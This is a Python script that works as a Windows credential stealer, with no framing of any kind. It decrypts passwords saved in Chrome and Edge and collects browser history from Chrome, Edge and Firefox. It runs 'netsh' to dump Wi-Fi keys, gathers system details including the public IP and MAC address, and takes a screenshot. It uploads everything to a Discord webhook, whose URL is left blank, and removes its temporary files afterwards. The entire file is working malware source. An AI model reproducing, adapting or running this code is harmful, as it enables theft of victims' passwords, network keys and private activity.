import os
import json
import shutil
import sqlite3
import subprocess
import platform
import socket
import psutil
import GPUtil
import requests
import base64
from datetime import datetime
from uuid import getnode as get_mac
from PIL import ImageGrab
from Cryptodome.Cipher import AES
import win32crypt

WEBHOOK_URL = ""

def decrypt_value(buff, master_key):
    try:
        if buff[:3] == b'v10':
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode(errors='ignore')
        else:
            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode(errors='ignore')
    except:
        return ""

# === Chrome Functions ===
def get_master_key():
    local_state_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Local State")
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def get_chrome_passwords(master_key):
    login_db = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
    if not os.path.exists(login_db):
        return []
    temp_db = "ChromeLoginDataTemp"
    shutil.copy2(login_db, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    results = []
    for url, user, pwd in cursor.fetchall():
        decrypted = decrypt_value(pwd, master_key)
        if user or decrypted:
            results.append({"url": url, "username": user, "password": decrypted})
    conn.close()
    os.remove(temp_db)
    return results

def get_chrome_history():
    history_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
    if not os.path.exists(history_path):
        return []
    temp_db = "ChromeHistoryTemp"
    shutil.copy2(history_path, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 10")
    results = [{"title": row[1], "url": row[0]} for row in cursor.fetchall()]
    conn.close()
    os.remove(temp_db)
    return results

# === Edge Functions (Chromium-based) ===
def get_edge_master_key():
    local_state_path = os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Local State")
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def get_edge_passwords(master_key):
    login_db = os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Default\Login Data")
    if not os.path.exists(login_db):
        return []
    temp_db = "EdgeLoginDataTemp"
    shutil.copy2(login_db, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    results = []
    for url, user, pwd in cursor.fetchall():
        decrypted = decrypt_value(pwd, master_key)
        if user or decrypted:
            results.append({"url": url, "username": user, "password": decrypted})
    conn.close()
    os.remove(temp_db)
    return results

def get_edge_history():
    history_path = os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Default\History")
    if not os.path.exists(history_path):
        return []
    temp_db = "EdgeHistoryTemp"
    shutil.copy2(history_path, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 10")
    results = [{"title": row[1], "url": row[0]} for row in cursor.fetchall()]
    conn.close()
    os.remove(temp_db)
    return results

# === Firefox Functions (History only) ===
def get_firefox_profile_path():
    base_path = os.path.expanduser(r"~\AppData\Roaming\Mozilla\Firefox\Profiles")
    if not os.path.exists(base_path):
        return None
    profiles = [d for d in os.listdir(base_path) if d.endswith(".default-release") or d.endswith(".default")]
    if not profiles:
        return None
    return os.path.join(base_path, profiles[0])

def get_firefox_history():
    profile = get_firefox_profile_path()
    if not profile:
        return []
    history_db = os.path.join(profile, "places.sqlite")
    if not os.path.exists(history_db):
        return []
    temp_db = "FirefoxHistoryTemp"
    shutil.copy2(history_db, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT url, title FROM moz_places ORDER BY last_visit_date DESC LIMIT 10")
    results = [{"title": row[1], "url": row[0]} for row in cursor.fetchall()]
    conn.close()
    os.remove(temp_db)
    return results

# === Wi-Fi Passwords ===
def get_wifi_passwords():
    try:
        output = subprocess.check_output("netsh wlan show profiles", shell=True, text=True, stderr=subprocess.DEVNULL)
        profiles = [line.split(":")[1].strip() for line in output.splitlines() if "All User Profile" in line]
        wifi_list = []
        for profile in profiles:
            try:
                result = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True, text=True, stderr=subprocess.DEVNULL)
                password = [line.split(":")[1].strip() for line in result.splitlines() if "Key Content" in line]
                wifi_list.append({"SSID": profile, "Password": password[0] if password else "None"})
            except subprocess.CalledProcessError:
                wifi_list.append({"SSID": profile, "Password": "ACCESS DENIED"})
        return wifi_list
    except Exception:
        return []

# === System Info ===
def get_system_info():
    return {
        "OS": platform.system(),
        "OS Version": platform.version(),
        "Processor": platform.processor(),
        "CPU Cores": psutil.cpu_count(logical=False),
        "Logical CPUs": psutil.cpu_count(logical=True),
        "RAM (GB)": round(psutil.virtual_memory().total / (1024**3), 2),
        "Disk Usage (%)": psutil.disk_usage("/").percent,
        "Hostname": socket.gethostname(),
        "Private IP": socket.gethostbyname(socket.gethostname()),
        "Public IP": requests.get("https://api.ipify.org").text,
        "MAC Address": ':'.join(('%012X' % get_mac())[i:i+2] for i in range(0, 12, 2)),
        "Boot Time": datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S"),
        "GPU": (GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else "None Detected"),
        # 30 top processes
        "Top Processes": [p.info for p in psutil.process_iter(['pid', 'name'])][:30]
    }

# === Screenshot ===
def take_screenshot(path="screenshot.png"):
    try:
        img = ImageGrab.grab()
        img.save(path)
        return path
    except Exception as e:
        print("Screenshot error:", e)
        return None

# === Send to Discord ===
def send_to_discord(data, screenshot_path=None):
    filename = "system_report.txt"
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4)

    with open(filename, "rb") as f:
        res = requests.post(WEBHOOK_URL, files={"file": (filename, f)})
    if res.status_code != 204:
        print("Failed to send report file:", res.status_code)
    else:
        print("Report file sent successfully.")

    if screenshot_path and os.path.exists(screenshot_path):
        with open(screenshot_path, "rb") as f:
            res = requests.post(WEBHOOK_URL, files={"file": (screenshot_path, f)})
        os.remove(screenshot_path)
        if res.status_code != 204:
            print("Failed to send screenshot:", res.status_code)
        else:
            print("Screenshot sent successfully.")

    if os.path.exists(filename):
        os.remove(filename)

def run():
    chrome_key = get_master_key()
    edge_key = get_edge_master_key()

    report = get_system_info()
    report["Wi-Fi Passwords"] = get_wifi_passwords()
    report["Chrome Passwords"] = get_chrome_passwords(chrome_key) if chrome_key else []
    report["Chrome History"] = get_chrome_history()
    report["Edge Passwords"] = get_edge_passwords(edge_key) if edge_key else []
    report["Edge History"] = get_edge_history()
    report["Firefox History"] = get_firefox_history()

    screenshot_path = take_screenshot()

    send_to_discord(report, screenshot_path)

if __name__ == "__main__":
    run()
